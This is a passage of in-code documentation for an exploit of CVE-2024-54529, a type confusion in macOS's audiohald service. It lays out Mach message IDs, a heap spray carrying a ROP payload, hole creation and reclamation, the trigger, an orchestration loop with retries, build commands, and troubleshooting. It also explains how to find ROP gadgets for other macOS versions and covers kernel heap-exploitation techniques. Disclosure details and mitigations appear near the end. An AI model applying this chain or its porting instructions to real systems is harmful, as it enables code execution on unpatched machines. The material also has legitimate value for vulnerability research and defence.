 *   3. Heap spray with ROP payload via plist property values
 *   4. Create holes by freeing allocations
 *   5. Create Engine objects to reclaim holes
 *   6. Trigger vulnerability (XIOContext_Fetch_Workgroup_Port)
 *
 * -----------------------------------------------------------------------------
 * M.2 MACH MESSAGE STRUCTURES FROM XCODE SDK
 * -----------------------------------------------------------------------------
 *
 * From /Applications/Xcode.app/.../usr/include/mach/message.h:
 *
 * MESSAGE HEADER (mach_msg_header_t):
 *
 *   typedef struct {
 *       mach_msg_bits_t       msgh_bits;         // Port rights + flags
 *       mach_msg_size_t       msgh_size;         // Total message size
 *       mach_port_t           msgh_remote_port;  // Destination port
 *       mach_port_t           msgh_local_port;   // Reply port
 *       mach_port_name_t      msgh_voucher_port; // Voucher port
 *       mach_msg_id_t         msgh_id;           // Message identifier
 *   } mach_msg_header_t;
 *
 * OOL DESCRIPTOR (mach_msg_ool_descriptor_t) - 64-bit:
 *
 *   typedef struct {
 *       void                         *address;    // Data address
 *       boolean_t                     deallocate: 8;
 *       mach_msg_copy_options_t       copy: 8;
 *       unsigned int                  pad1: 8;
 *       mach_msg_descriptor_type_t    type: 8;    // = 1 for OOL
 *       mach_msg_size_t               size;       // Data size
 *   } mach_msg_ool_descriptor_t;
 *
 * PORT DESCRIPTOR (mach_msg_port_descriptor_t):
 *
 *   typedef struct {
 *       mach_port_t                   name;       // Port name
 *       mach_msg_size_t               pad1;
 *       unsigned int                  pad2 : 16;
 *       mach_msg_type_name_t          disposition : 8;  // Right type
 *       mach_msg_descriptor_type_t    type : 8;         // = 0 for port
 *   } mach_msg_port_descriptor_t;
 *
 * DESCRIPTOR TYPES:
 *
 *   #define MACH_MSG_PORT_DESCRIPTOR         0
 *   #define MACH_MSG_OOL_DESCRIPTOR          1
 *   #define MACH_MSG_OOL_PORTS_DESCRIPTOR    2
 *   #define MACH_MSG_OOL_VOLATILE_DESCRIPTOR 3
 *
 * COPY OPTIONS:
 *
 *   #define MACH_MSG_PHYSICAL_COPY   0  // Actually copy data
 *   #define MACH_MSG_VIRTUAL_COPY    1  // COW (copy-on-write)
 *   #define MACH_MSG_ALLOCATE        2  // Kernel allocates for receiver
 *
 * -----------------------------------------------------------------------------
 * M.3 AUDIOHALD MESSAGE IDS
 * -----------------------------------------------------------------------------
 *
 * Complete message ID enumeration from helpers/message_ids.h:
 *
 *   XSystem_Open                    = 1010000  // Initialize client
 *   XSystem_Close                   = 1010001  // Close client
 *   XSystem_GetObjectInfo           = 1010002  // Get object type
 *   XSystem_CreateIOContext         = 1010003  // Create I/O context
 *   XSystem_DestroyIOContext        = 1010004  // Destroy I/O context
 *   XSystem_CreateMetaDevice        = 1010005  // Create aggregate device
 *   XSystem_DestroyMetaDevice       = 1010006  // Destroy aggregate device
 *   ...
 *   XObject_SetPropertyData_DPList  = 1010034  // Set property (plist)
 *   ...
 *   XObject_GetPropertyData_DCFString_QPList = 1010042  // Used for mktp
 *   ...
 *   XIOContext_Fetch_Workgroup_Port = 1010059  // VULNERABLE!
 *
 * MESSAGE STRUCTURE PATTERN:
 *
 *   Messages with OOL data follow this pattern:
 *
 *   +------------------------+
 *   | mach_msg_header_t      |  28 bytes
 *   +------------------------+
 *   | descriptor_count       |  4 bytes
 *   +------------------------+
 *   | descriptors[]          |  Variable (16 bytes each on 64-bit)
 *   +------------------------+
 *   | body data              |  Variable
 *   +------------------------+
 *
 * -----------------------------------------------------------------------------
 * M.4 KEY FUNCTIONS DETAILED
 * -----------------------------------------------------------------------------
 *
 * create_mach_port_with_send_and_receive_rights():
 *
 *   Creates a port we can both send to and receive from.
 *
 *   Step 1: mach_port_allocate(..., MACH_PORT_RIGHT_RECEIVE, &port)
 *     - Creates port with receive right
 *     - We can receive messages on this port
 *
 *   Step 2: mach_port_insert_right(..., MACH_MSG_TYPE_MAKE_SEND)
 *     - Adds send right from our receive right
 *     - We can now also send to this port
 *
 * generateAllocationPlistBinary():
 *
 *   Creates binary plist with ROP payload as UTF-16 strings.
 *
 *   Step 1: Load rop_payload.bin (1152 bytes)
 *   Step 2: Convert to UTF-16LE (576 code units)
 *   Step 3: Create CFString from bytes
 *   Step 4: Add to CFArray (allocs_per_iteration copies)
 *   Step 5: Wrap in CFDictionary with key "arr"
 *   Step 6: Serialize to binary plist
 *
 *   Result: Binary plist that when parsed, creates heap allocations
 *           containing our ROP payload.
 *
 * doAllocations():
 *
 *   Performs heap spray by repeatedly sending plist data.
 *
 *   For each iteration:
 *     1. Create MetaDevice (message 1010005)
 *     2. Set property 'acom' with plist (message 1010034)
 *     3. Each string in plist creates ~1168 byte allocation
 *     4. Total allocations = iterations Ã— allocs_per_iteration
 *
 * freeAllocation():
 *
 *   Creates heap holes by replacing large allocations.
 *
 *   Sends message 1010034 with tiny plist:
 *     <dict><key>arr</key><string>FREE</string></dict>
 *
 *   When audiohald processes this:
 *     1. Old CFArray is released
 *     2. All CFStrings in array are released
 *     3. Backing buffers (with payload) are freed
 *     4. Freed slots go to allocator freelist
 *
 * createEngineObjects():
 *
 *   Creates Engine objects that may land in freed holes.
 *
 *   Sends message 1010042 with selector 'mktp':
 *     - 'mktp' = "make tap" - creates Engine/Tap object
 *     - Engine object allocated via new/malloc
 *     - May reuse freed slot containing payload
 *
 * trigger_vulnerability():
 *
 *   Triggers the type confusion bug.
 *
 *   Sends message 1010059 (XIOContext_Fetch_Workgroup_Port):
 *     - Specifies object_id of an Engine object
 *     - Handler expects IOContext, gets Engine
 *     - Dereferences at wrong offset
 *     - If Engine in controlled memory, calls our gadget
 *
 * -----------------------------------------------------------------------------
 * M.5 MESSAGE FLOW DIAGRAM
 * -----------------------------------------------------------------------------
 *
 *   EXPLOIT                              AUDIOHALD
 *   -------                              ---------
 *
 *   1. bootstrap_look_up("com.apple.audio.audiohald")
 *      ----------------------------------------->
 *      <-----------------------------------------
 *      (receive send right to service_port)
 *
 *   2. Send message 1010000 (XSystem_Open)
 *      ----------------------------------------->
 *      (audiohald creates client state)
 *
 *   3. Send message 1010005 (CreateMetaDevice)
 *      ----------------------------------------->
 *      (audiohald creates MetaDevice N)
 *      <-----------------------------------------
 *      (returns object_id = N)
 *
 *   4. Send message 1010034 (SetPropertyData)
 *      [OOL: binary plist with payload]
 *      ----------------------------------------->
 *      (audiohald parses plist)
 *      (creates CFArray with CFStrings)
 *      (each CFString allocs ~1168 bytes)
 *      (PAYLOAD NOW IN HEAP)
 *
 *   5. Repeat steps 3-4 for num_iterations
 *
 *   6. Send message 1010034 (SetPropertyData)
 *      [OOL: small plist]
 *      ----------------------------------------->
 *      (audiohald replaces property)
 *      (old CFStrings released)
 *      (HOLES CREATED IN HEAP)
 *
 *   7. Send message 1010042 (GetPropertyData)
 *      [selector = 'mktp']
 *      ----------------------------------------->
 *      (audiohald creates Engine object)
 *      (Engine may land in hole!)
 *      (Engine memory contains payload residue)
 *
 *   8. Send message 1010002 (GetObjectInfo)
 *      ----------------------------------------->
 *      <-----------------------------------------
 *      (returns object type, e.g., "ngnejboa")
 *
 *   9. Send message 1010059 (FetchWorkgroupPort)
 *      [object_id = Engine object]
 *      ----------------------------------------->
 *      (audiohald handler:)
 *        - Fetches object by ID
 *        - Dereferences at offset 0x68
 *        - Gets "vtable" pointer (our data!)
 *        - Calls function at offset 0x168
 *        - STACK PIVOT! RSP = our payload
 *        - ROP CHAIN EXECUTES!
 *        - open() syscall creates file
 *
 * =============================================================================
 * =============================================================================
 * SECTION N: run_exploit.py - ORCHESTRATION
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * N.1 FILE OVERVIEW
 * -----------------------------------------------------------------------------
 *
 * FILE: exploit/run_exploit.py
 * PURPOSE: Automate exploitation loop with retry logic
 * USAGE: python3 run_exploit.py [options]
 *
 * The script:
 *   1. Checks prerequisites (exploit binary, ROP payload)
 *   2. Backs up original plist files
 *   3. Performs heap grooming (one-time)
 *   4. Crashes audiohald to reload with groomed heap
 *   5. Repeatedly triggers vulnerability until success
 *   6. Checks for success indicator file
 *
 * -----------------------------------------------------------------------------
 * N.2 CONFIGURATION CONSTANTS
 * -----------------------------------------------------------------------------
 *
 *   TARGET_FILE = "/Library/Preferences/Audio/malicious.txt"
 *     - File created by successful ROP chain
 *     - Existence indicates successful exploitation
 *
 *   PLIST_PATH = "/Library/Preferences/Audio/com.apple.audio.SystemSettings.plist"
 *     - CoreAudio settings file
 *     - Size indicates heap state
 *
 *   MIN_PLIST_SIZE = 1
 *   MAX_PLIST_SIZE = 10240
 *     - Used to detect if grooming is needed
 *     - Small plist = fresh state = needs grooming
 *
 * -----------------------------------------------------------------------------
 * N.3 EXPLOITATION ALGORITHM
 * -----------------------------------------------------------------------------
 *
 *   PHASE 1: HEAP GROOMING (one-time)
 *
 *     if (plist_size < MAX_PLIST_SIZE && !has_groomed):
 *         run: ./exploit --iterations 20 --allocs 1200
 *         # This creates 20 Ã— 1200 = 24,000 allocations
 *         # Each ~1168 bytes = ~28 MB of spray data
 *
 *         run: ./exploit --pre-crash
 *         # Crashes audiohald with invalid object ID
 *         # launchd restarts audiohald
 *         # audiohald loads plist, heap now large
 *
 *         has_groomed = True
 *
 *   PHASE 2: EXPLOITATION LOOP
 *
 *     while (!file_exists(TARGET_FILE)):
 *         run: ./exploit --attempts 1
 *         # Finds Engine object
 *         # Triggers vulnerability
 *
 *         sleep(3)
 *         # Wait for results
 *
 *   SUCCESS DETECTION:
 *
 *     - Check if /Library/Preferences/Audio/malicious.txt exists
 *     - File creation = ROP chain executed = code execution achieved
 *
 * -----------------------------------------------------------------------------
 * N.4 COMMAND LINE OPTIONS
 * -----------------------------------------------------------------------------
 *
 *   --no-reset
 *     Skip environment reset (for debugging)
 *
 *   --has-groomed
 *     Skip heap grooming phase (if already done)
 *     Useful for repeated runs without restarting
 *
 * -----------------------------------------------------------------------------
 * N.5 HELPER SCRIPT: reset-devices.sh
 * -----------------------------------------------------------------------------
 *
 * FILE: exploit/reset-devices.sh
 * PURPOSE: Reset CoreAudio to clean state
 *
 * Actions:
 *   1. Restore default plist files
 *   2. Unload coreaudiod via launchctl
 *   3. Reload coreaudiod via launchctl
 *
 * This ensures a fresh start for exploitation attempts.
 *
 * =============================================================================
 * =============================================================================
 * SECTION O: MAKEFILE AND BUILD PROCESS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * O.1 EXPLOIT MAKEFILE
 * -----------------------------------------------------------------------------
 *
 * FILE: exploit/Makefile
 *
 *   CXX = clang++
 *   CFLAGS = -g -O0 -fno-omit-frame-pointer -Wall -Wextra -std=c++17
 *   FRAMEWORKS = -framework CoreFoundation -framework CoreAudio
 *
 *   exploit: exploit.mm
 *       $(CXX) $(CFLAGS) $(FRAMEWORKS) exploit.mm -o exploit
 *
 * BUILD FLAGS EXPLAINED:
 *
 *   -g              Include debug symbols
 *   -O0             No optimization (easier debugging)
 *   -fno-omit-frame-pointer  Keep frame pointer for backtraces
 *   -Wall -Wextra   Enable warnings
 *   -std=c++17      C++17 standard (for std::vector, etc.)
 *
 * REQUIRED FRAMEWORKS:
 *
 *   CoreFoundation: For CFString, CFArray, CFDictionary, CFPropertyList
 *   CoreAudio:      Not strictly needed but included for completeness
 *
 * -----------------------------------------------------------------------------
 * O.2 COMPLETE BUILD PROCESS
 * -----------------------------------------------------------------------------
 *
 *   Step 1: Generate ROP payload
 *     $ cd exploit
 *     $ python3 build_rop.py
 *     [*] ROP chain written to rop_payload.bin
 *
 *   Step 2: Compile exploit
 *     $ make
 *     clang++ -g -O0 ... exploit.mm -o exploit
 *
 *   Step 3: Run exploit
 *     $ python3 run_exploit.py
 *     === CoreAudio Exploit Runner ===
 *     [*] Starting exploit loop...
 *
 * =============================================================================
 * =============================================================================
 * SECTION P: TECHNICAL ADDENDUM - SDK HEADER REFERENCES
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * P.1 KEY HEADER FILE LOCATIONS (Xcode SDK)
 * -----------------------------------------------------------------------------
 *
 * BASE PATH: /Applications/Xcode.app/Contents/Developer/Platforms/
 *            MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/
 *
 * MACH HEADERS:
 *   mach/message.h        - Message structures, bits, options
 *   mach/port.h           - Port types and rights
 *   mach/mach.h           - Master header (includes all)
 *   mach/mach_port.h      - Port manipulation functions
 *   mach/vm_map.h         - Virtual memory operations
 *   mach/kern_return.h    - Kernel return codes
 *
 * BOOTSTRAP:
 *   servers/bootstrap.h   - Service lookup functions
 *
 * SYSCALLS:
 *   sys/syscall.h         - Syscall number definitions
 *
 * COREFOUNDATION:
 *   CoreFoundation/CFString.h     - CFString functions
 *   CoreFoundation/CFArray.h      - CFArray functions
 *   CoreFoundation/CFDictionary.h - CFDictionary functions
 *   CoreFoundation/CFPropertyList.h - Plist serialization
 *
 * -----------------------------------------------------------------------------
 * P.2 KEY TYPE DEFINITIONS
 * -----------------------------------------------------------------------------
 *
 * From mach/port.h:
 *
 *   typedef natural_t mach_port_t;
 *   typedef natural_t mach_port_name_t;
 *
 *   typedef int mach_port_right_t;
 *   #define MACH_PORT_RIGHT_SEND         0
 *   #define MACH_PORT_RIGHT_RECEIVE      1
 *   #define MACH_PORT_RIGHT_SEND_ONCE    2
 *
 * From mach/kern_return.h:
 *
 *   typedef int kern_return_t;
 *   #define KERN_SUCCESS                 0
 *   #define KERN_INVALID_ADDRESS         1
 *   #define KERN_PROTECTION_FAILURE      2
 *   ...
 *
 * From mach/message.h:
 *
 *   typedef int mach_msg_return_t;
 *   #define MACH_MSG_SUCCESS             0
 *   #define MACH_SEND_MSG               0x00000001
 *   #define MACH_RCV_MSG                0x00000002
 *   #define MACH_SEND_TIMEOUT           0x00000010
 *   #define MACH_RCV_TIMEOUT            0x00000100
 *
 * -----------------------------------------------------------------------------
 * P.3 MESSAGE HEADER BITS MACROS
 * -----------------------------------------------------------------------------
 *
 * From mach/message.h:
 *
 *   // Bit field layout
 *   #define MACH_MSGH_BITS_REMOTE_MASK   0x0000001f
 *   #define MACH_MSGH_BITS_LOCAL_MASK    0x00001f00
 *   #define MACH_MSGH_BITS_VOUCHER_MASK  0x001f0000
 *   #define MACH_MSGH_BITS_COMPLEX       0x80000000U
 *
 *   // Setter macro
 *   #define MACH_MSGH_BITS_SET(remote, local, voucher, other)
 *       (MACH_MSGH_BITS_SET_PORTS((remote), (local), (voucher))
 *        | ((other) &~ MACH_MSGH_BITS_PORTS_MASK))
 *
 *   // Port right types for messages
 *   #define MACH_MSG_TYPE_MOVE_RECEIVE   16
 *   #define MACH_MSG_TYPE_MOVE_SEND      17
 *   #define MACH_MSG_TYPE_MOVE_SEND_ONCE 18
 *   #define MACH_MSG_TYPE_COPY_SEND      19
 *   #define MACH_MSG_TYPE_MAKE_SEND      20
 *   #define MACH_MSG_TYPE_MAKE_SEND_ONCE 21
 *
 * =============================================================================
 * =============================================================================
 * SECTION Q: DEBUGGING AND TROUBLESHOOTING
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * Q.1 COMMON ISSUES AND SOLUTIONS
 * -----------------------------------------------------------------------------
 *
 * ISSUE: "Failed to open rop_payload.bin"
 *   CAUSE: ROP payload not generated
 *   FIX: Run python3 build_rop.py first
 *
 * ISSUE: "bootstrap lookup failed"
 *   CAUSE: audiohald not running
 *   FIX: sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.audio.coreaudiod.plist
 *
 * ISSUE: Exploit runs but no file created
 *   CAUSE: Gadget addresses wrong for this macOS version
 *   FIX: Find new gadgets for your specific macOS build
 *
 * ISSUE: audiohald crashes but no code execution
 *   CAUSE: Heap layout didn't align correctly
 *   FIX: Try different iteration/allocs values
 *
 * ISSUE: "rop_payload.bin must be exactly 1152 bytes"
 *   CAUSE: Modified build_rop.py incorrectly
 *   FIX: Ensure padding fills to exactly 1152 bytes
 *
 * -----------------------------------------------------------------------------
 * Q.2 DEBUGGING COMMANDS
 * -----------------------------------------------------------------------------
 *
 * Check if audiohald is running:
 *   $ ps aux | grep audiohald
 *
 * View audiohald crash logs:
 *   $ ls ~/Library/Logs/DiagnosticReports/audiohald*
 *   $ cat ~/Library/Logs/DiagnosticReports/audiohald_*.crash
 *
 * Monitor audiohald activity:
 *   $ sudo fs_usage -w | grep audiohald
 *
 * Check heap state:
 *   $ sudo heap -addresses all audiohald
 *
 * Trace Mach messages:
 *   $ sudo dtrace -n 'mach_msg*:entry { @[execname] = count(); }'
 *
 * Verify ROP payload:
 *   $ xxd rop_payload.bin | head -20
 *   $ python3 -c "print(len(open('rop_payload.bin','rb').read()))"
 *
 * -----------------------------------------------------------------------------
 * Q.3 FINDING GADGETS FOR DIFFERENT macOS VERSIONS
 * -----------------------------------------------------------------------------
 *
 * The ROP gadget addresses in build_rop.py are version-specific.
 * To find gadgets for a different macOS version:
 *
 * 1. Dump the dyld shared cache:
 *    $ dyld_shared_cache_util -extract /tmp/cache /System/Library/dyld/dyld_shared_cache_x86_64h
 *
 * 2. Find gadgets in libsystem_c.dylib:
 *    $ ROPgadget --binary /tmp/cache/usr/lib/system/libsystem_c.dylib
 *
 * 3. Search for specific patterns:
 *    $ ROPgadget --binary ... | grep "pop rdi ; ret"
 *    $ ROPgadget --binary ... | grep "xchg rsp"
 *    $ ROPgadget --binary ... | grep "syscall"
 *
 * 4. Calculate actual addresses:
 *    - Get base address from dyld cache
 *    - Add gadget offset
 *    - Account for ASLR slide if needed
 *
 * =============================================================================
 * =============================================================================
 * SECTION R: SECURITY RESEARCH CONTEXT
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * R.1 RESPONSIBLE DISCLOSURE
 * -----------------------------------------------------------------------------
 *
 * This vulnerability was discovered and reported responsibly:
 *
 *   Researcher: Dillon Franke (Google Project Zero)
 *   Report Date: October 9, 2024
 *   Fix Date: December 11, 2024
 *   Disclosure: January 7, 2025 (90-day policy)
 *
 * Project Zero follows a 90-day disclosure policy:
 *   https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html
 *
 * -----------------------------------------------------------------------------
 * R.2 EDUCATIONAL PURPOSE
 * -----------------------------------------------------------------------------
 *
 * This documentation is for educational and defensive security purposes:
 *
 *   - Understanding IPC vulnerability classes
 *   - Learning heap exploitation techniques
 *   - Studying ROP chain construction
 *   - Improving secure coding practices
 *   - Developing detection mechanisms
 *
 * Defenders can use this knowledge to:
 *   - Audit similar code for type confusion bugs
 *   - Implement proper type validation
 *   - Monitor for exploitation attempts
 *   - Develop detection rules
 *
 * -----------------------------------------------------------------------------
 * R.3 MITIGATION RECOMMENDATIONS
 * -----------------------------------------------------------------------------
 *
 * For developers:
 *
 *   1. ALWAYS validate object types before use
 *   2. Use strong typing in C++ (not void*)
 *   3. Implement runtime type checks
 *   4. Consider using safe abstractions
 *
 * For system administrators:
 *
 *   1. Keep macOS updated (15.2+, 14.7.2+, 13.7.2+)
 *   2. Monitor audiohald crashes
 *   3. Restrict access to audio services if possible
 *   4. Use EDR to detect exploitation attempts
 *
 * =============================================================================
 * END OF CVE-2024-54529 EXPLOIT CHAIN DOCUMENTATION
 * =============================================================================
 */

/*
 * #############################################################################
 * #############################################################################
 * ##                                                                         ##
 * ##    PART 4: ADVANCED EXPLOITATION TECHNIQUES & RESEARCH REFERENCES       ##
 * ##                                                                         ##
 * ##    For Advanced Hackers: Deep Technical Context                         ##
 * ##                                                                         ##
 * #############################################################################
 * #############################################################################
 *
 * =============================================================================
 * =============================================================================
 * SECTION S: XNU KERNEL IPC INTERNALS - FROM SOURCE
 * =============================================================================
 * =============================================================================
 *
 * References:
 *   - XNU Source: osfmk/ipc/ipc_port.h, ipc_kmsg.h, ipc_mqueue.h
 *   - Path: references_and_notes/xnu/osfmk/ipc/
 *
 * -----------------------------------------------------------------------------
 * S.1 struct ipc_port - THE KERNEL PORT OBJECT
 * -----------------------------------------------------------------------------
 *
 * From XNU osfmk/ipc/ipc_port.h:
 *
 *   struct ipc_port {
 *       struct ipc_object       ip_object;      // Base object with refcount
 *       union {
 *           WAITQ_FLAGS(ip_waitq
 *               , ip_fullwaiters:1     // Senders blocked on full queue
 *               , ip_sprequests:1      // send-possible requests outstanding
 *               , ip_spimportant:1     // importance donating
 *               , ip_impdonation:1     // port supports importance donation
 *               , ip_tempowner:1       // dont give donations to receiver
 *               , ip_guarded:1         // port guarded (context as guard)
 *               , ip_strict_guard:1    // Strict guarding
 *               , ip_sync_link_state:3 // link to destination port/Workloop
 *               // ... more flags
 *           );
 *           struct waitq        ip_waitq;
 *       };
 *       // ... continues with message queue, kobject pointer, etc.
 *   };
 *
 * CRITICAL FIELDS FOR EXPLOITATION:
 *
 *   ip_object.io_references:
 *     - Reference count for the port
 *     - When 0, port is deallocated
 *     - Manipulating this = UAF potential
 *
 *   ip_kobject:
 *     - Kernel object pointer (for special ports)
 *     - Type determined by ip_object.io_bits IKOT_* field
 *     - IKOT_TASK: points to task_t
 *     - IKOT_CLOCK: points to clock object
 *     - Controlling this = kernel object confusion
 *
 *   ip_messages:
 *     - Message queue for pending messages
 *     - struct ipc_mqueue with linked list of ipc_kmsg
 *
 * WHY THIS MATTERS:
 *
 *   Mach port exploitation often targets:
 *   1. Reference count manipulation (UAF)
 *   2. IKOT type confusion (fake kobjects)
 *   3. Message queue corruption
 *
 * -----------------------------------------------------------------------------
 * S.2 struct ipc_kmsg - KERNEL MESSAGE REPRESENTATION
 * -----------------------------------------------------------------------------
 *
 * From XNU osfmk/ipc/ipc_kmsg.h:
 *
 *   Comment from header:
 *   "This structure is only the header for a kmsg buffer;
 *    the actual buffer is normally larger. The rest of the buffer
 *    holds the body of the message.
 *
 *    In a kmsg, the port fields hold pointers to ports instead
 *    of port names. These pointers hold references.
 *
 *    The ikm_header.msgh_remote_port field is the destination
 *    of the message."
 *
 * KEY INSIGHT FOR EXPLOITATION:
 *
 *   Userspace messages contain port NAMES (32-bit integers).
 *   Kernel messages contain port POINTERS (64-bit addresses).
 *
 *   During ipc_kmsg_copyin():
 *     - Userspace port names are translated to kernel pointers
 *     - References are taken on the ports
 *     - This translation is a source of bugs!
 *
 *   During ipc_kmsg_copyout():
 *     - Kernel pointers translated back to port names
 *     - New names may be allocated in receiver's namespace
 *
 * OOL DESCRIPTOR KERNEL HANDLING:
 *
 *   When kernel processes OOL descriptors:
 *
 *   ipc_kmsg_copyin_ool_descriptor() {
 *       // Validate and map sender's memory
 *       kr = vm_map_copyin(sender_map, addr, size, FALSE, &copy);
 *
 *       // Store as vm_map_copy_t in kernel message
 *       // This is COW (copy-on-write) backed
 *   }
 *
 *   ipc_kmsg_copyout_ool_descriptor() {
 *       // Map into receiver's address space
 *       kr = vm_map_copyout(receiver_map, &addr, copy);
 *
 *       // Receiver gets NEW allocation containing our data
 *   }
 *
 * EXPLOITATION IMPLICATIONS:
 *
 *   OOL descriptors let us:
 *   1. Create controlled allocations in target process
 *   2. Size controlled by us (descriptor.size)
 *   3. Content controlled by us (our buffer data)
 *   4. This is the BASIS for heap spray!
 *
 * -----------------------------------------------------------------------------
 * S.3 MIG SUBSYSTEM - MESSAGE DISPATCH
 * -----------------------------------------------------------------------------
 *
 * MIG (Mach Interface Generator) creates dispatch code from .defs files.
 *
 * SUBSYSTEM STRUCTURE (from analysis):
 *
 *   struct mig_subsystem {
 *       mig_server_routine_t    server;     // Main dispatcher
 *       mach_msg_id_t           start;      // First message ID
 *       mach_msg_id_t           end;        // Last message ID
 *       unsigned int            maxsize;    // Max message size
 *       vm_address_t            reserved;
 *       struct routine_descriptor {
 *           mig_impl_routine_t  impl;       // Handler function
 *           mig_stub_routine_t  stub;       // Stub for unpacking
 *           unsigned int        argc;       // Argument count
 *           unsigned int        descr_count;// Descriptor count
 *           // ...
 *       } routine[n];
 *   };
 *
 * DISPATCH FLOW IN AUDIOHALD:
 *
 *   _HALB_MIGServer_server(request, reply):
 *       msgh_id = request->msgh_id
 *       index = msgh_id - subsystem->start
 *       if (index >= 0 && index < (end - start)):
 *           routine = subsystem->routine[index]
 *           return routine.stub(request, reply)
 *       return MIG_BAD_ID
 *
 * SECURITY IMPLICATIONS:
 *
 *   - Message IDs are sequential (easy enumeration)
 *   - Handlers trust input parsing already done
 *   - Type confusion if handler assumes wrong object type
 *   - No global input validation before dispatch
 *
 * =============================================================================
 * =============================================================================
 * SECTION T: HEAP EXPLOITATION PRIMITIVES - ADVANCED TECHNIQUES
 * =============================================================================
 * =============================================================================
 *
 * References:
 *   - Project Zero: "In-the-Wild iOS Exploit Chain 2"
 *     https://projectzero.google/2019/08/in-wild-ios-exploit-chain-2.html
 *   - Project Zero: "What is a good memory corruption?"
 *     https://projectzero.google/2015/06/what-is-good-memory-corruption.html
 *
 * -----------------------------------------------------------------------------
 * T.1 ZONE ALLOCATOR FUNDAMENTALS (kalloc/zalloc)
 * -----------------------------------------------------------------------------
 *
 * XNU uses zone-based allocation for kernel memory:
 *
 * ZONE TYPES:
 *
 *   kalloc zones: General purpose (kalloc.16, kalloc.32, ..., kalloc.4096)
 *   ipc.ports:    Fixed-size zone for ipc_port structures
 *   ipc.kmsgs:    Zone for kernel messages
 *   tasks:        Zone for task structures
 *
 * ZONE STRUCTURE:
 *
 *   Zones contain "chunks" (pages or groups of pages).
 *   Each chunk is divided into fixed-size elements.
 *   Free elements are linked via in-band freelist.
 *
 * FREELIST STRUCTURE:
 *
 *   When an element is freed:
 *     - First 8 bytes become "next" pointer
 *     - Rest of memory may still contain old data!
 *     - This is CRITICAL for exploitation
 *
 *   Free element:
 *   +------------------+
 *   | next_free_ptr    |  <- Only this is zeroed/changed
 *   +------------------+
 *   | OLD DATA REMAINS |  <- Our payload still here!
 *   | ...              |
 *   +------------------+
 *
 * ZONE TRANSFER ATTACK:
 *
 *   From Project Zero iOS chain analysis:
 *
 *   "mach_zone_force_gc() triggers garbage collection, freeing
 *    empty zone chunks and making them available for reallocation
 *    across zonesâ€”enabling 'zone transfer' attacks."
 *
 *   Attack pattern:
 *   1. Fill zone A with controlled objects
 *   2. Free all objects (zone chunk becomes empty)
 *   3. Trigger GC (chunk returned to general pool)
 *   4. Allocate in zone B (reuses chunk from zone A)
 *   5. Zone B objects overlap zone A layout!
 *
 * -----------------------------------------------------------------------------
 * T.2 USERSPACE HEAP (libmalloc) FOR audiohald
 * -----------------------------------------------------------------------------
 *
 * audiohald uses standard libmalloc (scalable malloc):
 *
 * SIZE CLASSES:
 *
 *   TINY: 16, 32, 48, 64, ..., 1008 bytes (nano zone if enabled)
 *   SMALL: 1024, 2048, 4096, ..., 32KB
 *   LARGE: > 32KB (direct vm_allocate)
 *
 * OUR PAYLOAD (1152 bytes):
 *
 *   Falls in SMALL size class.
 *   Allocator rounds to nearest bin (likely 1536 or 2048).
 *   All spray allocations hit same bin = predictable layout.
 *
 * MAGAZINE-BASED ALLOCATION:
 *
 *   libmalloc uses per-CPU magazines to reduce lock contention:
 *
 *   struct magazine_t {
 *       void *mag_last_free;        // Most recent free (hot)
 *       region_t *mag_last_region;  // Most recent region
 *       // ...
 *   };
 *
 *   Allocation path:
 *   1. Check mag_last_free (LIFO: last freed = first reused)
 *   2. Check magazine freelist
 *   3. Allocate from region
 *
 *   LIFO BEHAVIOR IS KEY:
 *   - We free slots containing payload
 *   - Next allocation of same size reuses SAME SLOT
 *   - Engine object lands where payload was!
 *
 * -----------------------------------------------------------------------------
 * T.3 OOL PORTS FOR FAKE OBJECTS
 * -----------------------------------------------------------------------------
 *
 * From Project Zero iOS analysis:
 *
 * "Out-of-line ports descriptors in userspace (32-bit port names)
 *  are converted to kernel buffers containing 64-bit kernel pointers
 *  (one per port name), allowing attackers to create fake kernel
 *  objects from out-of-line port descriptors."
 *
 * TECHNIQUE:
 *
 *   1. Create many mach ports (get port names)
 *   2. Send OOL ports descriptor with these names
 *   3. Kernel allocates buffer with 64-bit pointers
 *   4. Each pointer = address of ipc_port structure
 *   5. Can be used to spray known addresses!
 *
 * NOT DIRECTLY USED HERE:
 *
 *   This exploit uses OOL memory (not OOL ports).
 *   OOL memory gives us content control.
 *   OOL ports give us pointer spray (for kernel exploits).
 *
 * -----------------------------------------------------------------------------
 * T.4 PIPE BUFFER TECHNIQUE
 * -----------------------------------------------------------------------------
 *
 * From Project Zero:
 *
 * "Pipes provide mutable 4096-byte buffers. Unlike one-shot message
 *  descriptors, pipe contents can be emptied and refilled without
 *  deallocationâ€”crucial for maintaining fake kernel objects during
 *  exploitation."
 *
 * PIPE vs OOL:
 *
 *   OOL Memory:
 *     - Immutable after send
 *     - Must send new message to change
 *     - Good for spray (one-time setup)
 *
 *   Pipe Buffer:
 *     - Mutable via write()/read()
 *     - Can update fake object fields
 *     - Good for maintaining fake objects
 *
 * KERNEL EXPLOITATION PATTERN:
 *
 *   1. Spray with OOL memory (fill heap)
 *   2. Create holes (free some OOL)
 *   3. Fill holes with pipe buffers
 *   4. Now can modify fake objects in-place!
 *
 * =============================================================================
 * =============================================================================
 * SECTION U: TYPE CONFUSION EXPLOITATION THEORY
 * =============================================================================
 * =============================================================================
 *
 * Reference:
 *   - Project Zero: "What is a good memory corruption?"
 *     https://projectzero.google/2015/06/what-is-good-memory-corruption.html
 *
 * -----------------------------------------------------------------------------
 * U.1 VULNERABILITY CLASSIFICATION
 * -----------------------------------------------------------------------------
 *
 * From Project Zero analysis of exploitability:
 *
 * EXPLOITATION RELIABILITY FACTORS:
 *
 *   "100% reliable" exploitation requires:
 *   1. "Guaranteed to succeed against a specific version"
 *   2. "A series of deterministic and fully understood steps"
 *   3. "Adequate control that all unreliability can be detected"
 *
 * TYPE CONFUSION CHARACTERISTICS:
 *
 *   "Type confusion vulnerabilities can lead to very weird but
 *    usually fully deterministic side-effects."
 *
 *   CVE-2024-54529 is type confusion:
 *   - Object A treated as Object B
